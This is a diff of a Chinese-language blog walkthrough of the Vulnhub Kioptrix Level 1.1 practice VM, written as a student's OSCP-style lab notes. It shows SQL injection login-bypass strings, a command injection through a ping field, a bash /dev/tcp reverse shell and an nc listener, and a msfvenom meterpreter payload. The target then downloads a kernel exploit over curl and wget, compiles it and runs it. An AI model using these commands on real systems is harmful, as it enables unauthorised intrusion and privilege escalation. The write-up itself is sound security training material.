+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-02-03 17:08:24</span>
+        <span class="mobile">2024-02-03 17:08:24</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-03-09 17:10:53</span>
+            <span class="mobile">2024-03-09 17:10:53</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/%E7%B1%BBOSCP%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/">类OSCP靶机练习</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/vulnhub/">vulnhub</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.5k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>6 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="Kioptrix-Level-1-1-2"><a href="#Kioptrix-Level-1-1-2" class="headerlink" title="Kioptrix Level 1.1(#2)"></a>Kioptrix Level 1.1(#2)</h1><blockquote>
+<p>参考 <a class="link" target="_blank" rel="noopener" href="https://hummus-ful.github.io/vulnhub/2021/01/25/Kioptrix_2.html">Kioptrix: Level 1.1 (#2) | Hacking Walkthroughs, Writeups and Guides (hummus-ful.github.io) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
-<h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2>
-<h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h3>
-<ul>
+<h2 id="渗透思路"><a href="#渗透思路" class="headerlink" title="渗透思路"></a>渗透思路</h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul>
 <li>nmap扫描ip，得到IP为<code>192.168.89.138</code></li>
 <li>nmap扫描端口及端口服务</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 10:25 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.138)</span><br><span class="line">Host is up (0.00071s latency).</span><br><span class="line">Not shown: 65528 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE  VERSION</span><br><span class="line">22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">111/tcp  open  rpcbind  2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">605/tcp  open  status   1 (RPC #100024)</span><br><span class="line">631/tcp  open  ipp      CUPS 1.1</span><br><span class="line">3306/tcp open  mysql    MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:50:56:39:80:A3 (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.70 seconds</span><br></pre></td></tr></table></figure></div>
+
 <p><strong>看到了web服务：80端口和443端口</strong></p>
 <ul>
 <li>用浏览器访问<code>http://192.168.89.138</code>，发现是一个登录界面</li>
 </ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.08.05.png" alt="截屏2024-02-03_下午5.08.05"></p>
 <ul>
 <li>F12 查看源代码</li>
 </ul>
-<img src="/2024/02/03/Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'>
+<img lazyload src="/images/loading.svg" data-src="Kioptrix_Level_1.1/截屏2024-02-03_下午5.09.55.png" alt="截屏2024-02-03_下午5.09.55" style="zoom:70%;">
+
 <p>看到<code>Start of HTML when logged in as Administartor</code>，推测用户名为<code>Administrator</code>(其实好像无关，但一些CTFer的基因动了，有些敏感hhh)</p>
-<h4 id="我的体验"><a class="markdownIt-Anchor" href="#我的体验"></a> 我的体验</h4>
-<p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p>
-<h3 id="web渗透"><a class="markdownIt-Anchor" href="#web渗透"></a> web渗透</h3>
-<h4 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> Sql注入</h4>
-<ul>
-<li>
-<p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>' or '1' = '1 </code>（这里的sql注入很简单，很多思路都是可以的）</p>
+<h4 id="我的体验"><a href="#我的体验" class="headerlink" title="我的体验"></a>我的体验</h4><p>信息收集还算成功，也找到了突破口是web服务，看到登录表，第一想法就是sql注入，但死在web渗透经验为0，且sql注入不熟悉，因此卡在了这里。需要从0开始训练一下sql注入。</p>
+<h3 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h3><h4 id="Sql注入"><a href="#Sql注入" class="headerlink" title="Sql注入"></a>Sql注入</h4><ul>
+<li><p>在username中输入<code>Administrator</code>(事实上随便输入什么都可以)，接着在password中输入<code>&#39; or &#39;1&#39; = &#39;1 </code>（这里的sql注入很简单，很多思路都是可以的）</p>
 </li>
-<li>
-<p>还有一篇walkthrough里面有人是username输入<code>admin' or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p>
+<li><p>还有一篇walkthrough里面有人是username输入<code>admin&#39; or 1=1-- s</code>(这里的s不必要，但是–后必须有空格)，然后password随意输入</p>
 <ul>
 <li><em><strong>–是一种sql的单行注释语句，注意：–后面有空格</strong></em></li>
 </ul>
 </li>
-<li>
-<p>成功后看到以下页面：</p>
+<li><p>成功后看到以下页面：</p>
 </li>
 </ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h4 id="寻找漏洞rce漏洞"><a class="markdownIt-Anchor" href="#寻找漏洞rce漏洞"></a> 寻找漏洞：RCE漏洞</h4>
-<ul>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.35.22.png" alt="截屏2024-02-03_下午5.35.22"></p>
+<h4 id="寻找漏洞：RCE漏洞"><a href="#寻找漏洞：RCE漏洞" class="headerlink" title="寻找漏洞：RCE漏洞"></a>寻找漏洞：RCE漏洞</h4><ul>
 <li>根据提示：ping a machine on the network，随便填了一个ip<code>8.8.8.8</code>，发现会显示shell命令以及执行结果</li>
 </ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.48.17.png" alt="截屏2024-02-03_下午5.48.17"></p>
 <ul>
 <li>猜测存在RCE漏洞：Remote Code/Command Execute（第一次知道这叫做RCE），输入<code>8.8.8.8;whoami</code></li>
 </ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%885.50.46.png" alt="截屏2024-02-03_下午5.50.46"></p>
 <p>看到了whoami的结果<code>apache</code>，<em>看来拿到shell之后还要提权了</em></p>
 <p><strong>证明确实存在RCE</strong></p>
-<h4 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h4>
-<h5 id="反弹shell"><a class="markdownIt-Anchor" href="#反弹shell"></a> 反弹shell</h5>
-<blockquote>
-<p>参考 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com)</a></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><blockquote>
+<p>参考 <a class="link" target="_blank" rel="noopener" href="https://www.jianshu.com/p/9456473a0a14">Linux下几种常见的反弹shell方式 - 简书 (jianshu.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
-<h6 id="0x01-bash建立tcp连接"><a class="markdownIt-Anchor" href="#0x01-bash建立tcp连接"></a> 0x01 bash建立tcp连接</h6>
-<ul>
-<li>
-<p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p>
+<h6 id="0x01-bash建立tcp连接"><a href="#0x01-bash建立tcp连接" class="headerlink" title="0x01 bash建立tcp连接"></a>0x01 bash建立tcp连接</h6><ul>
+<li><p>利用<code>bash -i &gt;&amp; /dev/tcp/192.168.89.137/4444 0&gt;&amp;1</code>，反弹shell</p>
 </li>
-<li>
-<p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p>
+<li><p>在kali攻击机中开启监听 <code>nc -nvlp 4444</code></p>
 </li>
 </ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%886.01.38.png" alt="截屏2024-02-03_下午6.01.38"></p>
 <p>成功拿到shell，但只是个权限很低的apache用户，接下来就是提权了</p>
-<h6 id="0x02-msfvenom生成后门"><a class="markdownIt-Anchor" href="#0x02-msfvenom生成后门"></a> 0x02 msfvenom生成后门</h6>
-<blockquote>
-<p>参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p>
+<h6 id="0x02-msfvenom生成后门"><a href="#0x02-msfvenom生成后门" class="headerlink" title="0x02 msfvenom生成后门"></a>0x02 msfvenom生成后门</h6><blockquote>
+<p>参考<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1  常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
 <ul>
 <li><code>msfvenom</code>生成后门命名为<code>shell4444</code>，开启http服务上传shell给靶机下载，msf进行监听，然后靶场执行shell，成功反弹shell</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure>
-<h3 id="linux-提权-linux-privilege-escalation"><a class="markdownIt-Anchor" href="#linux-提权-linux-privilege-escalation"></a> Linux 提权  Linux Privilege Escalation</h3>
-<blockquote>
-<p>参考 <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权</a></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.89.137 LPOTR=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f elf -o shell4444</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="Linux-提权-Linux-Privilege-Escalation"><a href="#Linux-提权-Linux-Privilege-Escalation" class="headerlink" title="Linux 提权  Linux Privilege Escalation"></a>Linux 提权  Linux Privilege Escalation</h3><blockquote>
+<p>参考 <a class="link" target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation">Linux 提权 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
-<h4 id="提权信息收集"><a class="markdownIt-Anchor" href="#提权信息收集"></a> 提权信息收集</h4>
-<ul>
+<h4 id="提权信息收集"><a href="#提权信息收集" class="headerlink" title="提权信息收集"></a>提权信息收集</h4><ul>
 <li>根据参考，使用<code>lsb_release -a 2&gt;/dev/null</code>查看os信息</li>
 </ul>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(cat /proc/version || uname -a ) 2&gt;/dev/null</span><br><span class="line">lsb_release -a 2&gt;/dev/null # old, not by default on many systems</span><br><span class="line">cat /etc/os-release 2&gt;/dev/null # universal on modern systems</span><br></pre></td></tr></table></figure></div>
+
 <p><em>2&gt;/dev/null 是把标准错误输出到“黑洞”，即删除错误信息，可以解决大量屏幕输出的问题</em></p>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.46.56.png" alt="截屏2024-02-03_下午10.46.56"></p>
 <p><strong>发现Linux版本是CentOS 4.5</strong></p>
 <ul>
 <li>还有一种工具<code>LinEnum.sh</code>脚本可以枚举目标靶机版本信息、用户信息、权限信息、环境信息、第三方软件信息，进程信息等</li>
 </ul>
 <blockquote>
-<p>关于工具使用：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客</a></p>
+<p>关于工具使用：<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43571641/article/details/124374101">Linux提权辅助工具_./linux-exploit-suggester.sh-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
-<h4 id="寻找centos-45漏洞利用提权脚本"><a class="markdownIt-Anchor" href="#寻找centos-45漏洞利用提权脚本"></a> 寻找CentOS 4.5漏洞利用提权脚本</h4>
-<ul>
+<h4 id="寻找CentOS-4-5漏洞利用提权脚本"><a href="#寻找CentOS-4-5漏洞利用提权脚本" class="headerlink" title="寻找CentOS 4.5漏洞利用提权脚本"></a>寻找CentOS 4.5漏洞利用提权脚本</h4><ul>
 <li><code>searchsploit CentOS 4.5</code></li>
 </ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8810.54.18.png" alt="截屏2024-02-03_下午10.54.18"></p>
 <ul>
 <li>存到本地 <code>searchsploit -m linux_x86/local/9542.c</code></li>
 </ul>
-<h4 id="将脚本传到靶机"><a class="markdownIt-Anchor" href="#将脚本传到靶机"></a> 将脚本传到靶机</h4>
-<h5 id="0x01-python-simplehttpserver-快速共享当前目录"><a class="markdownIt-Anchor" href="#0x01-python-simplehttpserver-快速共享当前目录"></a> 0x01 Python SimpleHTTPServer 快速共享当前目录</h5>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="将脚本传到靶机"><a href="#将脚本传到靶机" class="headerlink" title="将脚本传到靶机"></a>将脚本传到靶机</h4><h5 id="0x01-Python-SimpleHTTPServer-快速共享当前目录"><a href="#0x01-Python-SimpleHTTPServer-快速共享当前目录" class="headerlink" title="0x01 Python SimpleHTTPServer 快速共享当前目录"></a>0x01 Python SimpleHTTPServer 快速共享当前目录</h5><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python2</span></span><br><span class="line">python -m SimpleHTTPServer &lt;port&gt;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Python3</span></span><br><span class="line">python3 -m http.server &lt;port&gt;</span><br></pre></td></tr></table></figure></div>
+
 <ul>
 <li>在攻击机 <code>9542.c</code>所在目录使用命令<code>python3 -m http.server 6789</code></li>
 </ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.09.57.png" alt="截屏2024-02-03_下午11.09.57"></p>
 <ul>
 <li>靶机通过<code>curl http://192.168.89.137:6789/9542.c --output /tmp/9542.c</code> 拉取文件至本地</li>
 </ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><mark><em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em></mark></p>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.13.18.png" alt="截屏2024-02-03_下午11.13.18"></p>
+<p>==<em><strong>这里output设置的路径，对于当前用户来说，必须要有写的权限，通过在根目录下<code>ls -al</code>看到apache用户只在<code>/tmp</code>文件中拥有<code>wx</code>的权限，因此选择存在<code>/tmp</code>文件下</strong></em>==</p>
 <ul>
 <li>同时在攻击机上也可以看到靶机的信息</li>
 </ul>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h5 id="0x02-service-apache2-start"><a class="markdownIt-Anchor" href="#0x02-service-apache2-start"></a> 0x02 service apache2 start</h5>
-<ul>
-<li>
-<p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p>
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.16.41.png" alt="截屏2024-02-03_下午11.16.41"></p>
+<h5 id="0x02-service-apache2-start"><a href="#0x02-service-apache2-start" class="headerlink" title="0x02 service apache2 start"></a>0x02 service apache2 start</h5><ul>
+<li><p>在攻击机上打开apache服务：<code>sudo service apache2 start</code></p>
 </li>
-<li>
-<p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p>
+<li><p>在攻击机上将9542.c 传到<code>/var/www/html</code>文件夹中：<code>sudo mv 9542.c /var/www/html</code></p>
 </li>
-<li>
-<p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p>
+<li><p>靶机通过<code>wget/curl</code>拉取文件：<code>wget http://192.168.89.137/9542.c</code></p>
 </li>
-<li>
-<p>同样需要注意<strong>存储的文件夹权限问题</strong></p>
+<li><p>同样需要注意<strong>存储的文件夹权限问题</strong></p>
 </li>
 </ul>
-<h4 id="编译运行脚本"><a class="markdownIt-Anchor" href="#编译运行脚本"></a> 编译运行脚本</h4>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure>
-<p><img src="/2024/02/03/Kioptrix_Level_1.1/%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h2 id="学习总结"><a class="markdownIt-Anchor" href="#学习总结"></a> 学习总结</h2>
-<blockquote>
-<p>优秀总结：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com)</a></p>
+<h4 id="编译运行脚本"><a href="#编译运行脚本" class="headerlink" title="编译运行脚本"></a>编译运行脚本</h4><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ./9542.c -o 9542 #编译</span><br><span class="line">./9542 #运行</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="./%E6%88%AA%E5%B1%8F2024-02-03_%E4%B8%8B%E5%8D%8811.23.15.png" alt="截屏2024-02-03_下午11.23.15"></p>
+<h2 id="学习总结"><a href="#学习总结" class="headerlink" title="学习总结"></a>学习总结</h2><blockquote>
+<p>优秀总结：<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/wsec/p/vulnhub0x02.html">0×02 Vulnhub靶机渗透总结之 KIOPTRIX: LEVEL 1.1 (#2) 常规命令注入+内核提权 - wsec - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 </blockquote>
-<h3 id="关于631端口-ipp服务-cups-11"><a class="markdownIt-Anchor" href="#关于631端口-ipp服务-cups-11"></a> 关于631端口 ipp服务 CUPS 1.1</h3>
-<ul>
+<h3 id="关于631端口-ipp服务-CUPS-1-1"><a href="#关于631端口-ipp服务-CUPS-1-1" class="headerlink" title="关于631端口 ipp服务 CUPS 1.1"></a>关于631端口 ipp服务 CUPS 1.1</h3><ul>
 <li>是一种打印机相关的服务，searchsploit找到了一些提权脚本，但靶机没有打印机设备</li>
 </ul>
-<h3 id="关于渗透方向"><a class="markdownIt-Anchor" href="#关于渗透方向"></a> 关于渗透方向</h3>
-<ul>
+<h3 id="关于渗透方向"><a href="#关于渗透方向" class="headerlink" title="关于渗透方向"></a>关于渗透方向</h3><ul>
 <li>根据靶机打开的端口，一一尝试后，成功找到了RCE的web漏洞</li>
 </ul>
-<h3 id="关于-linux-提权"><a class="markdownIt-Anchor" href="#关于-linux-提权"></a> 关于 Linux 提权</h3>
-<ul>
-<li>
-<p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p>
+<h3 id="关于-Linux-提权"><a href="#关于-Linux-提权" class="headerlink" title="关于 Linux 提权"></a>关于 Linux 提权</h3><ul>
+<li><p>尝试过sudo提权，这也是一种方向，但无法利用，失败告终</p>
 </li>
-<li>
-<p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p>
+<li><p>利用os信息收集，有自动化脚本，已安装到我的tools文件夹中，详见[Linux 提权  Linux Privilege Escalation](#Linux 提权  Linux Privilege Escalation)章节</p>
 <ul>
 <li>LinEnum 可以枚举信息</li>
-<li><a target="_blank" rel="noopener" href="http://lse.sh">lse.sh</a> 可以枚举一些系统可能存在的漏洞信息</li>
+<li>lse.sh 可以枚举一些系统可能存在的漏洞信息</li>
 </ul>
 <p>以上都是要在靶机中运行的，因此脚本需要通过http服务传到靶机中</p>
 </li>
-<li>
-<p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p>
+<li><p>还要注意当前用户是否在某目录拥有wx权限，通常<code>/tmp</code>文件夹可以</p>
 </li>
 </ul>
-<h3 id="关于主机间传文件-via-http"><a class="markdownIt-Anchor" href="#关于主机间传文件-via-http"></a> 关于主机间传文件 via http</h3>
-<ul>
+<h3 id="关于主机间传文件-via-http"><a href="#关于主机间传文件-via-http" class="headerlink" title="关于主机间传文件 via http"></a>关于主机间传文件 via http</h3><ul>
 <li>Python建立简单http服务</li>
 <li>在攻击机中开启apache</li>
 </ul>
-<h3 id="关于web渗透sql注入"><a class="markdownIt-Anchor" href="#关于web渗透sql注入"></a> 关于web渗透sql注入</h3>
-<ul>
+<h3 id="关于web渗透sql注入"><a href="#关于web渗透sql注入" class="headerlink" title="关于web渗透sql注入"></a>关于web渗透sql注入</h3><ul>
 <li>sql注入知识（<strong>有待进一步学习</strong>）</li>
 </ul>
 
-</article>
-    
-    
+        </div>
 
-</div>
-<div class="trm-post-next-prev row">
-    <div class="col-lg-12">
-        <!-- title -->
-        <h5 class="trm-title-with-divider">
